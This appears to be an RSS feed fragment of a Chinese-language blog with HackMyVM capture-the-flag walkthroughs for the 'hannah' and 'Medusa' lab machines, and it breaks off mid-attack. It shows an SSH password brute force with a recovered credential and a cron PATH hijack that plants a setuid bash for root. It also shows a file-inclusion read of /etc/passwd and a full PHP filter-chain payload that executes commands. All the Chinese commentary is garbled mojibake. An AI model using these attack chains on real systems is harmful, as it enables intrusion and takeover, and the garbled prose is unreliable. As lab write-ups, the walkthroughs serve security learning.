|_  256 85:3d:da:74:b2:68:4e:a6:f7:e5:f5:85:40:90:2e:9a (ED25519)
|_auth-owners: root
80/tcp  open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-robots.txt: 1 disallowed entry 
|_/enlightenment
|_http-title: Site doesn't have a title (text/html).
|_auth-owners: moksha
113/tcp open  ident?
|_auth-owners: root
MAC Address: 08:00:27:7C:E4:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.31 ms 192.168.205.150

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.58 seconds
                                                   
```

113Êú™Áü•Á´ØÂè£Ôºå‰ºòÂÖàÊü•Áúã

# 2.Ë∏©ÁÇπ

https://book.hacktricks.wiki/zh/network-services-pentesting/113-pentesting-ident.html#basic-information

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.150:113                                                                       
curl: (56) Recv failure: ËøûÊé•Ë¢´ÂØπÊñπÈáçÁΩÆ
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc 192.168.205.150 113 
hello 
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -vn 192.168.205.150 113
(UNKNOWN) [192.168.205.150] 113 (auth) open
hello
                            

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ident-user-enum 192.168.205.150 80 22 113
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

192.168.205.150:80      moksha
192.168.205.150:22      root
192.168.205.150:113     root
                               
```

Êúâ‰∏Ä‰∏™mokshaÁî®Êà∑ÔºåÊàë‰ª¨Â∞ùËØïÁàÜÁ†¥ssh

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ hydra -l moksha -P /usr/share/wordlists/q5000.txt ssh://192.168.205.150 -V -I -u -f -e nsr -t 64

Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-08 16:23:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 5003 login tries (l:1/p:5003), ~79 tries per task
[DATA] attacking ssh://192.168.205.150:22/
[22][ssh] host: 192.168.205.150   login: moksha   password: hannah
[STATUS] attack finished for 192.168.205.150 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-08 16:23:44

```

ÊàëÁ¨¨‰∏ÄÊ¨°ÁàÜÁ†¥ÁöÑÊó∂ÂÄôÊ≤°Âá∫Êù•ÔºåÁúüÁöÑÊúâÁÇπÊó†ËØ≠

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ssh moksha@192.168.205.150    
moksha@192.168.205.150's password: 
Linux hannah 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jan  4 10:45:54 2023 from 192.168.1.51
moksha@hannah:~$ id
uid=1000(moksha) gid=1000(moksha) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```

# 3.ÊèêÊùÉ

```
moksha@hannah:~$ sudo -l
-bash: sudo: orden no encontrada
moksha@hannah:~$ which sudo
moksha@hannah:~$ find / -name sudo 2&gt;/dev/null
/usr/share/bash-completion/completions/sudo
moksha@hannah:~$ /usr/share/bash-completion/completions/sudo -l
-bash: /usr/share/bash-completion/completions/sudo: Permiso denegado
moksha@hannah:~$ ls -la /usr/share/bash-completion/completions/sudo
-rw-r--r-- 1 root root 1504 ago 12  2020 /usr/share/bash-completion/completions/sudo

```

ÊàëËøò‰ª•‰∏∫ÂèàËóèsudoÂë¢

```
moksha@hannah:~$ ls -la
total 32
drwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .
drwxr-xr-x 3 root   root   4096 ene  4  2023 ..
lrwxrwxrwx 1 moksha moksha    9 ene  4  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 moksha moksha  220 ene  4  2023 .bash_logout
-rw-r--r-- 1 moksha moksha 3526 ene  4  2023 .bashrc
drwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .local
-rw-r--r-- 1 moksha moksha  807 ene  4  2023 .profile
-rw------- 1 moksha moksha   14 ene  4  2023 user.txt
-rw------- 1 moksha moksha   52 ene  4  2023 .Xauthority
moksha@hannah:~$ cd ..
moksha@hannah:/home$ ls -al
total 12
drwxr-xr-x  3 root   root   4096 ene  4  2023 .
drwxr-xr-x 18 root   root   4096 ene  4  2023 ..
drwxr-xr-x  3 moksha moksha 4096 ene  4  2023 moksha
moksha@hannah:/home$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
moksha@hannah:/home$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/ping cap_net_raw=ep
moksha@hannah:/home$ cat /etc/cron*
cat: /etc/cron.d: Es un directorio
cat: /etc/cron.daily: Es un directorio
cat: /etc/cron.hourly: Es un directorio
cat: /etc/cron.monthly: Es un directorio
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
* * * * * root touch /tmp/enlIghtenment
17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
#
cat: /etc/cron.weekly: Es un directorio

moksha@hannah:/tmp$ which touch
/usr/bin/touch

moksha@hannah:/tmp$ ls -la /media
total 12
drwxrwxrwx  3 root root 4096 ene  4  2023 .
drwxr-xr-x 18 root root 4096 ene  4  2023 ..
lrwxrwxrwx  1 root root    6 ene  4  2023 cdrom -&gt; cdrom0
drwxr-xr-x  2 root root 4096 ene  4  2023 cdrom0

```

Êúâ‰∏Ä‰∏™ÂÆöÊó∂‰ªªÂä°ÔºåÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞ÂÆÉÁöÑÁéØÂ¢ÉÂèòÈáè‰πüÊúâÈóÆÈ¢òÔºåÊâÄ‰ª•

```
moksha@hannah:/tmp$ echo 'cp /bin/bash /tmp/sh;chmod u+s /tmp/sh' &gt; /media/touch
moksha@hannah:/tmp$ ls /tmp/
enlIghtenment
systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-logind.service-Bwv8Xg
systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-timesyncd.service-S60g6e
moksha@hannah:/tmp$ chmod +x /media/touch

```

Á≠âÂ≠êÂºπÈ£û‰∏Ä‰ºö

```
moksha@hannah:/tmp$ ls
enlIghtenment  systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-logind.service-Bwv8Xg
sh             systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-timesyncd.service-S60g6e
moksha@hannah:/tmp$ ./sh -p
sh-5.1# id
uid=1000(moksha) gid=1000(moksha) euid=0(root) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```

‚Äç&lt;!-- ##{'timestamp':1739012133}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_hannah.html</guid><pubDate>Sat, 08 Feb 2025 10:55:33 +0000</pubDate></item><item><title>hmv_Medusa</title><link>https://7r1UMPHK.github.io/post/hmv_Medusa.html</link><description># 0.ÁÆÄ‰ªã

Èù∂Êú∫Ôºöhttps://hackmyvm.eu/machines/?v=Medusa
 ÈöæÂ∫¶ÔºöÁªøËâ≤
 ÁõÆÊ†á IPÔºö192.168.205.145
 Êú¨Êú∫ IPÔºö192.168.205.128

# 1.Êâ´Êèè

nmapËµ∑Êâã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -A -Pn -n --min-rate 10000 192.168.205.145
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-04 17:42 CST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 192.168.205.145
Host is up (0.00026s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 70:d4:ef:c9:27:6f:8d:95:7a:a5:51:19:51:fe:14:dc (RSA)
|   256 3f:8d:24:3f:d2:5e:ca:e6:c9:af:37:23:47:bf:1d:28 (ECDSA)
|_  256 0c:33:7e:4e:95:3d:b0:2d:6a:5e:ca:39:91:0d:13:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.54 (Debian)
MAC Address: 08:00:27:5D:E9:45 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.26 ms 192.168.205.145

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.08 seconds
                                                           
```

# 2.Ë∏©ÁÇπ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ftp 192.168.205.145
Connected to 192.168.205.145.
220 (vsFTPd 3.0.3)
Name (192.168.205.145:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp&gt; 
ftp&gt; exit
221 Goodbye.
```

‰∏çËÆ∏ÁôªÔºåÈÇ£ÂéªÁúã80„ÄÇÊòØ‰∏™ÈªòËÆ§È°µ

![image-20250331190711601](https://7r1umphk.github.io/image/20250331190711760.png)

ÊúâÂÖ≥Á±ª‰ººÊòØÁî®Êà∑ÂêçÁöÑ‰∏úË•øKrakenÔºå‰∏çÁÆ°ÂÖàÔºåÊàë‰ª¨ÁõÆÂΩïÁàÜÁ†¥‰∏Ä‰∏ã

ps:Âõ†‰∏∫ÂÆÉÊúâ‰∏Ä‰∏™manualË∑ØÂæÑ‰ºöÁàÜÂá∫ÂæàÂ§öÊ≤°ÊúâÂà©Áî®‰ª∑ÂÄºÁöÑ‰∫åÁ∫ßÁõÆÂΩïÔºåÊâÄ‰ª•Êàë‰ª¨ËøôÊ¨°Áî®gobusterÔºåÁÑ∂ÂêéÂÜçËøáÊª§‰∏Ä‰∫õ403ÁöÑÊ≤°Áî®Áä∂ÊÄÅÁ†Å

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.145 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.145
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10674]
/.                    (Status: 200) [Size: 10674]
/manual               (Status: 301) [Size: 319] [--&gt; http://192.168.205.145/manual/]
/hades                (Status: 301) [Size: 318] [--&gt; http://192.168.205.145/hades/]
Progress: 598000 / 598005 (100.00%)
===============================================================
Finished
===============================================================
```

Êé•ÁùÄÁàÜÁ†¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.145/hades/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.145/hades/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 0]
/.                    (Status: 200) [Size: 0]
/door.php             (Status: 200) [Size: 555]
Progress: 598000 / 598005 (100.00%)
===============================================================
Finished
===============================================================
```

ËÆøÈóÆ/door.php

![image-20250331190726085](https://7r1umphk.github.io/image/20250331190726175.png)

ËæìÂÖ•‰πãÂâçËé∑ÂæóÁöÑKraken

ps:ÊúâÁÇπÊêûÁ¨ëÔºåÂÆÉËßÑÂÆö‰∫ÜÂè™ÂèØ‰ª•ËæìÂÖ•6‰∏™Â≠óÁ¨¶

![image-20250331190733042](https://7r1umphk.github.io/image/20250331190733131.png)

Ëé∑Âæó‰∏Ä‰∏™ÂüüÂêçÔºåÊàë‰ª¨Âä†‰∏äÔºåÂπ∂‰∏îÁàÜÁ†¥‰∏Ä‰∏ãÂ≠êÂüü

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ffuf -u http://medusa.hmv -H 'Host: FUZZ.medusa.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 3423  

        /'___\  /'___\           /'___\     
       /\ \__/ /\ \__/  __  __  /\ \__/     
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\    
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/    
         \ \_\   \ \_\  \ \____/  \ \_\     
          \/_/    \/_/   \/___/    \/_/     

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://medusa.hmv
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.medusa.hmv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3423
________________________________________________

dev                     [Status: 200, Size: 1973, Words: 374, Lines: 26, Duration: 164ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Âä†‰∏äËÆøÈóÆ

![image-20250331190750401](https://7r1umphk.github.io/image/20250331190750557.png)
 Ê≤°ÁúãÂà∞Âï•ÔºåÁõÆÂΩïÁàÜÁ†¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ gobuster dir -u http://dev.medusa.hmv/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.medusa.hmv/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1973]
/css                  (Status: 301) [Size: 314] [--&gt; http://dev.medusa.hmv/css/]
/files                (Status: 301) [Size: 316] [--&gt; http://dev.medusa.hmv/files/]
/assets               (Status: 301) [Size: 317] [--&gt; http://dev.medusa.hmv/assets/]
/.                    (Status: 200) [Size: 1973]
/manual               (Status: 301) [Size: 317] [--&gt; http://dev.medusa.hmv/manual/]
/robots.txt           (Status: 200) [Size: 489]
Progress: 470664 / 598005 (78.71%)
Progress: 491780 / 598005 (82.24%)
```

Êé•ÁùÄÁàÜÁ†¥/files

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ gobuster dir -u http://dev.medusa.hmv/files/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.medusa.hmv/files/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 0]
/system.php           (Status: 200) [Size: 0]
/.                    (Status: 200) [Size: 0]
/readme.txt           (Status: 200) [Size: 144]
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://dev.medusa.hmv/files/readme.txt
-----------------------------------------------
+  Don't trust your eyes, trust your instinct +
-----------------------------------------------
                                                 
```

Ë∞úËØ≠‰∫∫ÊªöÂá∫Âì•Ë∞≠

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wfuzz -u 'http://dev.medusa.hmv/files/system.php?FUZZ=id' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.medusa.hmv/files/system.php?FUZZ=id
Total requests: 119600

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                            
=====================================================================


Total time: 60.95589
Processed Requests: 119600
Filtered Requests: 119600
Requests/sec.: 1962.074

                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wfuzz -u 'http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd
Total requests: 119600

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                            
=====================================================================

000000167:   200        27 L     40 W       1452 Ch     'view'                                                             
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 2.243865
Processed Requests: 309
Filtered Requests: 308
Requests/sec.: 137.7087
```

ÁúãÁúºÊúâÊ≤°ÊúâÂØÜÈí•

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://dev.medusa.hmv/files/system.php?view=/home/spectre/.ssh/id_rsa
                           
```

Âà∞ËøôÊàë‰π†ÊÉØÂ∞±ÊòØÊµãphp filter

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://dev.medusa.hmv/files/system.php?view=php://filter/convert.base64-encode/resource=/etc/passwd
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTA0OjExMDpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA1OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3BlY3RyZTp4OjEwMDA6MTAwMDpzcGVjdHJlLCwsOi9ob21lL3NwZWN0cmU6L2Jpbi9iYXNoCnN5c3RlbWQtY29yZWR1bXA6eDo5OTk6OTk5OnN5c3RlbWQgQ29yZSBEdW1wZXI6LzovdXNyL3NiaW4vbm9sb2dpbgpmdHA6eDoxMDY6MTEzOmZ0cCBkYWVtb24sLCw6L3Nydi9mdHA6L3Vzci9zYmluL25vbG9naW4K                                                                                                                                    
```

ÈÇ£Áõ¥Êé•ÊâßË°åÂëΩ‰ª§ËØïËØï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl 'http://dev.medusa.hmv/files/system.php?view=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=id' --output -
